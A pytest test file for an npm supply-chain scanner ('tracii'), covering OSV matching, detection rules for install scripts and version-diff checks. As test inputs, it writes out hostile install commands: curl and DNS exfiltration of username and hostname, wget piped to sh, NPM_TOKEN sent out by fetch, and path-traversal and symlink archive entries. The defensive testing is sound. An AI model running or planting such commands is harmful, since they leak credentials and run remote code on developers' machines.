import tarfile

import pytest

from tests.conftest import FIXTURES, integrity, make_tarball
from tracii.detect import osv
from tracii.detect.static_rules import analyze_package
from tracii.diff.version_diff import diff_packages
from tracii.evidence.schema import Category
from tracii.evidence.slicing import slices_for_finding
from tracii.intake.npm_registry import (
    IntegrityError, UnsafeArchive, extract_in_memory, load_local_package, verify_integrity,
)
from tracii.inventory.lockfile import build_inventory

PKGS = FIXTURES / "packages"


def rules(findings):
    return {f.rule_or_advisory for f in findings}


def test_osv_matches_exact_versions_only(demo_project, mock_http):
    inv = build_inventory(*demo_project)
    findings, check = osv.scan(inv, demo_project[1], client=mock_http())
    assert check.status == "ran"
    got = {(f.package, f.version, f.rule_or_advisory) for f in findings}
    assert got == {("lodash", "4.17.20", "GHSA-35jh-r3h4-6jhm"), ("minimist", "1.2.5", "GHSA-xvch-5gv4-984h")}
    lodash = next(f for f in findings if f.package == "lodash")
    assert lodash.fixed_versions == ["4.17.21"] and lodash.category == Category.VULNERABILITY
    assert lodash.evidence[0].url.startswith("https://")


def test_osv_failure_is_reported_not_hidden(demo_project):
    import httpx
    client = httpx.Client(transport=httpx.MockTransport(lambda r: httpx.Response(503)))
    findings, check = osv.scan(build_inventory(*demo_project), b"", client=client)
    assert findings == [] and check.status == "failed"


def test_osv_dedupe_by_alias():
    a = osv.vuln_to_finding({"id": "GHSA-1", "aliases": ["CVE-1"]}, "p", "1.0.0", "osv-api")
    b = osv.vuln_to_finding({"id": "CVE-1", "aliases": ["GHSA-1"]}, "p", "1.0.0", "osv-api")
    assert len(osv.dedupe([a, b])) == 1


def test_malicious_fixture_produces_linked_chain():
    findings = analyze_package(load_local_package(PKGS / "fake-exfil"))
    chain = next(f for f in findings if f.rule_or_advisory == "TRACII-CHAIN-EXFIL")
    assert chain.category == Category.MALICIOUS_INDICATOR
    assert chain.severity.value == "high" and "install time" in chain.title
    steps = [e for e in chain.evidence if e.line]
    assert [e.summary for e in steps] == ["source: env_read", "transform: encode", "sink: network"]
    assert all(e.file == "setup.js" for e in steps)
    assert any("collector.example.invalid" in e.summary for e in chain.evidence)
    assert "TRACII-INSTALL-SCRIPT" in rules(findings)


def test_benign_api_client_is_not_a_chain():
    findings = analyze_package(load_local_package(PKGS / "benign-http-client"))
    assert findings == []


def test_install_time_recon_flagged():
    findings = analyze_package(load_local_package(PKGS / "prompt-injection"))
    assert "TRACII-CHAIN-EXFIL" in rules(findings)  # hostname -> dns at preinstall


def test_obfuscated_eval_flagged():
    findings = analyze_package(load_local_package(PKGS / "obfuscated-loader"))
    assert "TRACII-OBFUSCATED-EVAL" in rules(findings)


def test_slice_contains_only_relevant_code():
    pkg = load_local_package(PKGS / "fake-exfil")
    chain = next(f for f in analyze_package(pkg) if f.rule_or_advisory == "TRACII-CHAIN-EXFIL")
    slices = slices_for_finding(chain, pkg.files)
    assert len(slices) == 1 and "process.env" in slices[0].code and "https.request" in slices[0].code
    assert set(slices[0].evidence_ids) <= {e.id for e in chain.evidence}


def test_version_diff_highlights_new_install_script():
    old = load_local_package(PKGS / "benign-http-client")
    new = load_local_package(PKGS / "fake-exfil")
    new.name = old.name
    report = diff_packages(old, new)
    assert "postinstall" in report["install_scripts_added_or_changed"]
    assert "collector.example.invalid" in report["hosts_added"]
    assert {f["rule_or_advisory"] for f in report["findings"]} >= {"DIFF-INSTALL-SCRIPT", "DIFF-NEW-CAPABILITY"}


# ---- untrusted archive handling ----

def test_integrity_mismatch_rejected():
    blob = make_tarball({"package/index.js": b"1"})
    verify_integrity(blob, integrity(blob))
    with pytest.raises(IntegrityError):
        verify_integrity(blob + b"x", integrity(blob))
    with pytest.raises(IntegrityError):
        verify_integrity(blob, None)


@pytest.mark.parametrize("name", ["../evil.js", "/etc/passwd", "package/../../x.js"])
def test_path_traversal_rejected(name):
    with pytest.raises(UnsafeArchive):
        extract_in_memory(make_tarball({name: b"x"}))


def test_symlink_rejected():
    link = tarfile.TarInfo("package/link")
    link.type, link.linkname = tarfile.SYMTYPE, "/etc/passwd"
    with pytest.raises(UnsafeArchive):
        extract_in_memory(make_tarball({"package/index.js": b"1"}, extra=[link]))


def test_not_a_tarball_rejected():
    with pytest.raises(UnsafeArchive):
        extract_in_memory(b"this is not gzip")


# ---------- install commands, large install entries, destinations (synthetic, inert text) ----------

from tracii.detect import static_rules as _sr  # noqa: E402
from tracii.intake.npm_registry import PackageFiles  # noqa: E402


def _pkg(scripts=None, files=None, large=None):
    return PackageFiles(name="p", version="1.0.0", manifest={"scripts": scripts or {}}, files=files or {}, large=large or {})


def _flagged(findings):
    return {f.rule_or_advisory: f.severity.value for f in findings if f.severity.value in ("critical", "high", "medium")}


def test_hook_command_payloads():
    exfil = _pkg({"preinstall": 'curl -s "http://203.0.113.9/?u=$(whoami)&h=$(hostname)"'})
    assert _flagged(_sr.analyze_package(exfil)) == {"TRACII-HOOK-CMD-EXFIL": "high"}
    dns = _pkg({"install": """node -e "require('dns').lookup(require('os').userInfo().username + '.x.oast.fun', () => {})" """})
    assert _flagged(_sr.analyze_package(dns)) == {"TRACII-HOOK-CMD-EXFIL": "high"}
    assert _flagged(_sr.analyze_package(_pkg({"postinstall": "curl -sO https://example.org/a.txt"}))) == \
        {"TRACII-HOOK-CMD-NET": "medium"}
    piped = _pkg({"postinstall": "wget -qO- https://example.org/i.sh | sh"})
    assert _flagged(_sr.analyze_package(piped)) == {"TRACII-HOOK-CMD-EXFIL": "high"}


def test_benign_hook_commands_stay_quiet():
    for cmd in ["node-gyp rebuild", "prebuild-install -r napi || node-gyp rebuild", "node-gyp-build",
                """node -e "try{require('./postinstall')}catch(e){}" """, "tshy && bash build.sh",
                "install-from-cache --artifact build/Release/re2.node --host-var RE2_DOWNLOAD_MIRROR"]:
        assert _flagged(_sr.analyze_package(_pkg({"install": cmd}))) == {}, cmd


def test_large_bundle_read_only_when_an_install_script_runs_it():
    bundle = "x".join(["const h=require('os').hostname();require('https').request({hostname:'198.51.100.7'}).end(h);"]
                      + ["a"] * 10)
    run = _pkg({"postinstall": "node bundle.js"}, large={"bundle.js": bundle})
    assert _flagged(_sr.analyze_package(run)) == {"TRACII-CHAIN-EXFIL": "high"}
    assert _flagged(_sr.analyze_package(_pkg(large={"bundle.js": bundle}))) == {}   # not run at install: not read


def test_named_config_env_is_not_an_exfil_source():
    src = "const p = process.env.ESBUILD_BINARY_PATH;\nconst cp = require('child_process');\ncp.execSync('x')"
    f = _sr.analyze_package(_pkg({"postinstall": "node install.js"}, {"install.js": src}))
    assert _flagged(f) == {"TRACII-INSTALL-NET-EXEC": "medium"}
    secret = "const t = process.env.NPM_TOKEN;\nfetch('https://example.org', {body: t})"
    assert "TRACII-CHAIN-EXFIL" in _flagged(_sr.analyze_package(_pkg({"postinstall": "node i.js"}, {"i.js": secret})))


def test_destination_decides_install_download_severity():
    dl = "if (process.env.CI) {}\nrequire('https').get('https://registry.npmjs.org/@x/bin/-/bin.tgz', r => r)"
    f = _sr.analyze_package(_pkg({"postinstall": "node install.js"}, {"install.js": dl}))
    assert _flagged(f) == {} and any(x.severity.value == "low" for x in f)   # still reported, not flagged
    bad = "require('https').get('https://203.0.113.5/payload', r => r)"
    assert _flagged(_sr.analyze_package(_pkg({"postinstall": "node i.js"}, {"i.js": bad}))) == \
        {"TRACII-INSTALL-NET-EXEC": "high"}
    assert _sr.suspicious_hosts({"127.0.0.1", "10.0.0.2", "github.com", "a.b.oastify.com", "8.8.8.8"}) == \
        {"a.b.oastify.com", "8.8.8.8"}


def test_extract_collects_large_js_only_on_request():
    big = b"// " + b"a" * (1024 * 1024 + 10)
    blob = make_tarball({"package/bundle.js": big, "package/index.js": b"1", "package/blob.bin": big})
    large = {}
    files, skipped = extract_in_memory(blob, large)
    assert set(files) == {"index.js"} and set(skipped) == {"bundle.js", "blob.bin"} and set(large) == {"bundle.js"}
    files2, _ = extract_in_memory(blob)
    assert files2 == files


def test_osv_mal_record_is_malware_not_a_vulnerability():
    rec = {"id": "MAL-2025-1", "summary": "Malicious code in evil-pkg (npm)", "aliases": [],
           "affected": [{"package": {"ecosystem": "npm", "name": "evil-pkg"},
                         "ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}]}]}]}
    f = osv.vuln_to_finding(rec, "evil-pkg", "1.0.0", "osv-api")
    assert f.category == Category.MALICIOUS_INDICATOR and f.severity.value == "critical"
    assert f.confidence.value == "high" and f.fixed_versions == [] and f.title.startswith("Known malicious package")
    assert any("Remove the package" in x for x in f.limitations)
    normal = osv.vuln_to_finding({"id": "GHSA-x", "summary": "bug"}, "ok", "1.0.0", "osv-api")
    assert normal.category == Category.VULNERABILITY


def test_osv_mal_flows_into_gate_fix_and_sbom(demo_project, mock_http):
    from tracii import gate
    from tracii.export import sbom
    from tracii.fix import remediation
    from tracii.evidence.schema import ScanSource
    from tracii.pipeline import STORE, run_scan
    rec = STORE.new()
    scan = run_scan(rec, ScanSource(kind="fixture", label="t"), *demo_project, http=mock_http(), deep_limit=0)
    scan.findings = [osv.vuln_to_finding({"id": "MAL-2025-2", "summary": "Malicious code"}, "lodash", "4.17.20", "osv-api")]
    assert remediation.propose_fix(scan.findings[0], scan.inventory, rec.package_json).kind == "manual_review"
    g = gate.evaluate(scan, gate.GatePolicy(fail_on="critical"))
    assert g.outcome == "fail" and g.blocking[0].rule_or_advisory == "MAL-2025-2"
    assert "vulnerabilities" not in sbom.to_cyclonedx(scan, rec.package_json)


def test_shell_command_inside_code():
    src = "const cp = require('child_process');\ncp.execSync(`curl -s https://x.oast.fun/?h=$(hostname)`)"
    assert _flagged(_sr.analyze_package(_pkg(files={"lib/a.js": src}))) == {"TRACII-CODE-SHELL-EXFIL": "high"}
    plain = "const cp = require('child_process');\ncp.execSync('git rev-parse HEAD')"
    assert _flagged(_sr.analyze_package(_pkg(files={"lib/a.js": plain}))) == {}


def test_self_publish_only_when_actually_run():
    run = "const { execSync } = require('child_process');\nexecSync('npm publish --access public')"
    assert _flagged(_sr.analyze_package(_pkg(files={"auto.js": run}))) == {"TRACII-SELF-PUBLISH": "medium"}
    comment = "// `npm publish` re-runs the prepare script\nmodule.exports = 1"
    assert _flagged(_sr.analyze_package(_pkg(files={"c.js": comment}))) == {}


def test_install_running_only_build_tools_is_low():
    build = "const { spawn } = require('child_process');\nspawn('node-gyp', ['rebuild'])"
    f = _sr.analyze_package(_pkg({"install": "node build.js"}, {"build.js": build}))
    assert _flagged(f) == {} and any(x.severity.value == "low" and "node-gyp" in x.title for x in f)
    mixed = "const { spawn, execSync } = require('child_process');\nspawn('node-gyp', ['rebuild'])\nexecSync('schtasks /create')"
    assert _flagged(_sr.analyze_package(_pkg({"install": "node build.js"}, {"build.js": mixed}))) == \
        {"TRACII-INSTALL-NET-EXEC": "medium"}
    opaque = "const cp = require('child_process');\ncp.spawn(cmd, args)"   # command not visible: stays medium
    assert _flagged(_sr.analyze_package(_pkg({"install": "node build.js"}, {"build.js": opaque}))) == \
        {"TRACII-INSTALL-NET-EXEC": "medium"}


def test_obfuscator_style_code_is_flagged_even_in_large_files():
    obf = "var " + ",".join(f"_0x{i:04x}=1" for i in range(30)) + ";"
    assert _flagged(_sr.analyze_package(_pkg(files={"lib/x.js": obf}))) == {"TRACII-OBFUSCATED-CODE": "medium"}
    runs = _pkg(files={"package.json": "{}"}, large={"index.js": obf})
    runs.manifest["main"] = "index.js"
    assert _flagged(_sr.analyze_package(runs)) == {"TRACII-OBFUSCATED-CODE": "high"}
    minified = "var a=1,b=2,c=function(d){return d};" * 500       # ordinary minified code
    assert _flagged(_sr.analyze_package(_pkg(files={"m.js": minified}))) == {}


def test_native_addon_install_build_is_low_but_hostile_commands_stay_flagged():
    build = "const cp = require('child_process');\ncp.spawn(process.execPath, args)"
    native = _pkg({"install": "node build.js"}, {"build.js": build, "binding.gyp": "{}"})
    f = _sr.analyze_package(native)
    assert _flagged(f) == {} and any("native addon" in x.title for x in f)
    assert _flagged(_sr.analyze_package(_pkg({"install": "node build.js"}, {"build.js": build}))) == \
        {"TRACII-INSTALL-NET-EXEC": "medium"}          # same code without binding.gyp: still flagged
    hostile = "const cp = require('child_process');\ncp.execSync(`curl -s http://203.0.113.4/?u=$(whoami)`)"
    assert "TRACII-CODE-SHELL-EXFIL" in _flagged(_sr.analyze_package(
        _pkg({"install": "node build.js"}, {"build.js": hostile, "binding.gyp": "{}"})))


def test_version_diff_reports_code_injected_into_existing_files():
    from tracii.intake.npm_registry import PackageFiles
    src = "function debug(ns) {\n  return ns;\n}\nmodule.exports = debug;\n"
    old = PackageFiles("dbg", "1.0.0", {}, {"src/index.js": src, "README.md": "x"})
    payload = "var " + ",".join(f"_0x{i:04x}=1" for i in range(400)) + ";"
    new = PackageFiles("dbg", "1.0.1", {}, {"src/index.js": src + payload + "\n", "README.md": "x"})
    d = diff_packages(old, new)
    assert d["files_modified"] == ["src/index.js"] and d["security_relevant"]
    f = next(x for x in d["findings"] if x["rule_or_advisory"] == "DIFF-CODE-INJECTED")
    assert f["severity"] == "high" and any("character line added" in e["summary"] and e["line"] == 5 for e in f["evidence"])
    assert d["code_changes"]["src/index.js"]["obfuscator_ids_added"] == 400

    # ordinary edits, and a minified file that already had long lines, are not flagged
    mini_old = "!function(){" + "a=1;" * 900 + "}();"
    edit = PackageFiles("dbg", "1.0.2", {}, {"src/index.js": src.replace("return ns;", "return ns + '';"),
                                               "dist/x.min.js": mini_old.replace("a=1", "b=2")})
    d2 = diff_packages(PackageFiles("dbg", "1.0.1", {}, {"src/index.js": src, "dist/x.min.js": mini_old}), edit)
    assert d2["files_modified"] == ["dist/x.min.js", "src/index.js"] and not d2["findings"] and not d2["security_relevant"]

    # a capability new to one file counts even if the package used it elsewhere
    old3 = PackageFiles("p", "1", {}, {"a.js": "require('child_process')", "b.js": "module.exports = 1"})
    new3 = PackageFiles("p", "2", {}, {"a.js": "require('child_process')", "b.js": "module.exports = 1\nconst cp = require('child_process')"})
    f3 = next(x for x in diff_packages(old3, new3)["findings"] if x["rule_or_advisory"] == "DIFF-CODE-INJECTED")
    assert f3["severity"] == "medium" and f3["evidence"][0]["file"] == "b.js" and f3["evidence"][0]["line"] == 2
